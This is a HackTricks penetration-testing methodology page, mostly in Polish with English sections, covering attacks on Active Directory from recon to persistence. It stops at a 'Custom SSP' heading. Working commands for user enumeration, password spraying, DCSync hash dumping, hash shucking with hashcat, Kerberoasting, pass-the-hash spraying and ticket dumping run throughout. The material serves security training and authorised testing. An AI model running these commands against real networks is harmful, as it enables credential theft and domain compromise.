# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** pełni rolę kluczowej technologii, umożliwiając **network administrators** efektywne tworzenie i zarządzanie **domains**, **users** oraz **objects** w sieci. Została zaprojektowana tak, by skalować się i porządkować dużą liczbę użytkowników w zarządzalne **groups** i **subgroups**, jednocześnie kontrolując **access rights** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domains**, **trees** i **forests**. **Domain** obejmuje zbiór obiektów, takich jak **users** czy **devices**, które dzielą wspólną bazę danych. **Trees** to grupy tych domen połączone wspólną strukturą, a **forest** reprezentuje zbiór wielu trees, powiązanych przez **trust relationships**, tworząc najwyższy poziom struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne prawa **access** i komunikacji.

Kluczowe pojęcia w ramach **Active Directory** obejmują:

1. **Directory** – Zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – Oznacza byty w katalogu, w tym **users**, **groups** lub **shared folders**.
3. **Domain** – Służy jako kontener dla obiektów katalogu; w ramach **forest** może istnieć wiele domen, z każdą posiadającą własny zbiór obiektów.
4. **Tree** – Grupowanie domen, które dzielą wspólną root domain.
5. **Forest** – Najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku trees z istniejącymi między nimi **trust relationships**.

**Active Directory Domain Services (AD DS)** obejmuje zestaw usług istotnych dla scentralizowanego zarządzania i komunikacji w sieci. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **users** a **domains**, w tym **authentication** i funkcjami **search**.
2. **Certificate Services** – Nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **digital certificates**.
3. **Lightweight Directory Services** – Wspiera aplikacje korzystające z katalogu poprzez **LDAP protocol**.
4. **Directory Federation Services** – Zapewnia funkcje **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi, kontrolując ich nieautoryzowane rozpowszechnianie i użycie.
6. **DNS Service** – Kluczowa do rozwiązywania **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Aby nauczyć się, jak **attack an AD**, musisz bardzo dobrze **understand** proces **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Możesz zajrzeć na [https://wadcoms.github.io/](https://wadcoms.github.io) żeby szybko zobaczyć, które komendy możesz uruchomić, aby enumerate/exploitować AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** do wykonywania akcji. Jeśli spróbujesz uzyskać dostęp do maszyny przez adres IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Jeżeli masz dostęp do środowiska AD, ale nie posiadasz żadnych credentials/sessions, możesz:

- **Pentest the network:**
- Skanuj sieć, znajdź maszyny i otwarte porty oraz spróbuj **exploit vulnerabilities** lub **extract credentials** z nich (na przykład [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak web, printers, shares, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zajrzyj do ogólnej [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) aby znaleźć więcej informacji o tym, jak to robić.
- **Check for null and Guest access on smb services** (to nie zadziała na nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy poradnik dotyczący enumeracji SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy poradnik dotyczący enumeracji LDAP możesz znaleźć tutaj (zwróć **szczególną uwagę na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Zbierz credentials, **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta przez [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbierz credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębnij usernames/names z wewnętrznych dokumentów, social media, usług (głównie web) w środowisku domeny oraz z zasobów publicznie dostępnych.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz spróbować różnych konwencji AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najbardziej powszechne konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Zobacz strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) oraz [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy zostanie podany **invalid username** serwer odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala stwierdzić, że nazwa użytkownika jest nieprawidłowa. **Valid usernames** spowodują albo otrzymanie **TGT in a AS-REP** response albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-authentication.
- **No Authentication against MS-NRPC**: Używając auth-level = 1 (No authentication) przeciwko interfejsowi MS-NRPC (Netlogon) na domain controllers. Metoda wywołuje funkcję `DsrGetDcNameEx2` po zbindowaniu interfejsu MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje bez jakichkolwiek credentials. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje tego typu enumerację. Badania można znaleźć [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeśli znajdziesz jeden z tych serwerów w sieci, możesz również wykonać **user enumeration against it**. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Jeśli udało Ci się zenumerować active directory, będziesz miał **więcej adresów e-mail i lepsze zrozumienie sieci**. Możesz być w stanie wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack).

### Looks for Creds in Computer Shares | SMB Shares

Teraz, gdy masz podstawowe credentials, sprawdź, czy możesz **znaleźć** jakieś **interesujące pliki udostępnione w AD**. Możesz to zrobić ręcznie, ale to bardzo nudne, powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz uzyskać dostęp do innych PCs lub shares, możesz **umieścić pliki** (np. SCF file), które jeśli zostaną w jakiś sposób otwarte, spowodują uwierzytelnienie NTLM przeciwko Tobie, dzięki czemu będziesz mógł przechwycić **NTLM challenge** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta luka umożliwiała dowolnemu uwierzytelnionemu użytkownikowi **skompromisowanie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Do poniższych technik zwykły użytkownik domeny nie wystarczy — potrzebujesz specjalnych uprawnień/credentials, aby je przeprowadzić.**

### Hash extraction

Miejmy nadzieję, że udało Ci się **skompromisować jakieś konto local admin** używając [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) łącznie z relayingiem, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Nadszedł czas na zrzucenie wszystkich hashów z pamięci i lokalnie.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz hash użytkownika**, możesz go użyć do **podszycia się** pod niego.  
Musisz użyć narzędzia, które wykona uwierzytelnienie **NTLM** z użyciem tego **hasha**, **lub** możesz utworzyć nowe **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak że przy każdym **NTLM authentication** ten **hash** będzie używany. Ta ostatnia opcja to to, co robi mimikatz.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **użyć NTLM hasha użytkownika do żądania biletów Kerberos**, jako alternatywę dla powszechnego Pass The Hash przez protokół NTLM. W związku z tym może być szczególnie **przydatny w sieciach, gdzie protokół NTLM jest wyłączony** i tylko **Kerberos jest dozwolony** jako protokół uwierzytelniania.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **przechwytują bilet uwierzytelniający użytkownika** zamiast jego hasła czy wartości hash. Skradziony bilet jest następnie używany do **podszywania się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Jeśli masz **hash** lub **password** lokalnego administratora, spróbuj **zalogować się lokalnie** na innych **PCs** przy jego użyciu.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Zauważ, że to jest dość **głośne** i **LAPS** mogłoby to **złagodzić**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **access MSSQL instances**, może użyć ich do **execute commands** na hoście MSSQL (jeśli działa jako SA), **steal** NetNTLM **hash** lub nawet wykonać **relay** **attack**.\
Również, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **use the trust relationship to execute queries also in the other instance**. Te zaufania mogą być łańcuchowane i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, gdzie będzie mógł wykonać komendy.\
**Połączenia między bazami danych działają nawet przez forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Narzędzia inwentaryzacji i deploymentu firm trzecich często ujawniają potężne ścieżki do poświadczeń i wykonania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz jakikolwiek obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić TGTs z pamięci każdego użytkownika, który loguje się na tym komputerze.\
Zatem, jeśli **Domain Admin logins onto the computer**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (oby był to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma pozwolenie na "Constrained Delegation", będzie mógł **impersonate any user to access some services in a computer**.\
Następnie, jeśli **compromise the hash** tego użytkownika/komputera, będziesz mógł **impersonate any user** (nawet Domain Admins) aby uzyskać dostęp do niektórych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** na obiekcie Active Directory zdalnego komputera umożliwia osiągnięcie execution kodu z **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Skompromitowany użytkownik może mieć interesujące uprawnienia nad niektórymi obiektami domeny, które pozwolą na późniejsze **move** lateralne/**escalate** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Odkrycie **Spool service listening** w domenie może być **abused** do **acquire new credentials** i **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Jeśli **other users** **access** skompromitowaną maszynę, możliwe jest **gather credentials from memory** a nawet **inject beacons in their processes** aby podszyć się pod nich.\
Zazwyczaj użytkownicy łączą się z systemem przez RDP, więc tutaj masz jak wykonać kilka ataków na sesje RDP osób trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** dostarcza system do zarządzania **local Administrator password** na komputerach dołączonych do domeny, zapewniając, że jest ona **randomized**, unikalna i często **changed**. Te hasła są przechowywane w Active Directory, a dostęp kontrolowany jest przez ACLs tylko dla autoryzowanych użytkowników. Przy wystarczających uprawnieniach do dostępu do tych haseł, pivot do innych komputerów staje się możliwy.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** ze skompromitowanej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Jeśli skonfigurowane są **vulnerable templates**, można je nadużyć do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Gdy zdobędziesz uprawnienia **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **dump** **domain database**: _ntds.dit_.

[**Więcej informacji o ataku DCSync można znaleźć tutaj**](dcsync.md).

[**Więcej informacji o tym, jak ukraść NTDS.dit można znaleźć tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z technik omówionych wcześniej można użyć do utrzymania persistence.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Przyznać uprawnienia [**DCSync**](#dcsync) użytkownikowi

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Atak **Silver Ticket** tworzy **legitimate Ticket Granting Service (TGS) ticket** dla konkretnej usługi używając **NTLM hash** (na przykład **hash konta PC**). Ta metoda jest używana do **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **NTLM hash of the krbtgt account** w środowisku Active Directory (AD). To konto jest specjalne, ponieważ używane jest do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący zdobędzie ten hash, może tworzyć **TGTs** dla dowolnego konta, które wybierze (atak Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są podobne do golden tickets, sfałszowane w sposób, który **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich żądania** jest bardzo dobrą metodą pozwalającą utrzymać persistence w koncie użytkownika (nawet jeśli zmieni hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Używanie certyfikatów pozwala również na utrzymanie persistence z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **privileged groups** (jak Domain Admins i Enterprise Admins) poprzez stosowanie standardowego **Access Control List (ACL)** na tych grupach w celu zapobieżenia nieautoryzowanym zmianom. Jednak ta funkcja może być wykorzystana — jeśli atakujący zmodyfikuje ACL AdminSDHolder, aby dać pełny dostęp zwykłemu użytkownikowi, ten użytkownik zyska rozległą kontrolę nad wszystkimi uprzywilejowanymi grupami. Ta funkcja bezpieczeństwa, mająca chronić, może więc działać odwrotnie, umożliwiając nieuprawniony dostęp, jeśli nie jest ściśle monitorowana.

[**Więcej informacji o AdminDSHolder Group tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto **local administrator**. Uzyskując prawa administratora na takiej maszynie, można wydobyć hash lokalnego Administratora używając **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **enable the use of this password**, umożliwiając zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **give** pewne **special permissions** użytkownikowi nad konkretnymi obiektami domeny, które pozwolą temu użytkownikowi **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** służą do **store** **permissions** jakie **object** ma **over** inny **object**. Jeśli potrafisz wykonać nawet **małą zmianę** w **security descriptor** obiektu, możesz uzyskać bardzo interesujące uprawnienia nad tym obiektem bez potrzeby bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **universal password**, dając dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

